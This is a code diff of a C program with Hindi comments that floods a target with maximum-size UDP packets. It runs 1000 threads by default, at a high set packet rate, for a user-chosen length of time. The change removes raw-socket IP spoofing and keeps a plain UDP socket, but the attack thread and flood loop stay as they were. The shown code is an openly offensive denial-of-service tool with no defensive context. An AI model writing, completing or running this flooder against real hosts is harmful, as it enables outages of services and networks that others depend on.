@@ -5,9 +5,6 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 #include <time.h>
-#include <sys/socket.h>
-#include <netinet/udp.h>
-#include <netinet/ip.h>
 
 #define DEFAULT_THREADS 1000  // डिफॉल्ट थ्रेड्स
 #define FLOOD_RATE 10000      // प्रति सेकंड पैकेट्स (हाई रेट)
@@ -26,22 +23,18 @@ void generate_payload(char *buffer, size_t length) {
     }
 }
 
-// रॉ सॉकेट बनाने के लिए (IP स्पूफिंग)
-int create_raw_socket() {
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (sock == -1) {
-        perror("Raw socket error");
-        exit(1);
-    }
-    return sock;
-}
-
 // अटैक थ्रेड
 void *attack(void *arg) {
     struct thread_data *data = (struct thread_data *)arg;
-    int sock = create_raw_socket();
+    int sock;
     struct sockaddr_in server_addr;
     char packet[65507]; // UDP का मैक्सिमम पेलोड साइज (64KB)
+
+    // सॉकेट बनाएं
+    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+        perror("Socket creation failed");
+        pthread_exit(NULL);
+    }
 
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
@@ -51,10 +44,6 @@ void *attack(void *arg) {
     time_t end = time(NULL) + data->time; // यूजर द्वारा दिया गया समय
 
     while (time(NULL) <= end) {
-        // रैंडम सोर्स IP जनरेट करें (स्पूफिंग)
-        struct in_addr src_ip;
-        src_ip.s_addr = rand();
-
         // रैंडम पेलोड भरें
         generate_payload(packet, sizeof(packet));
 
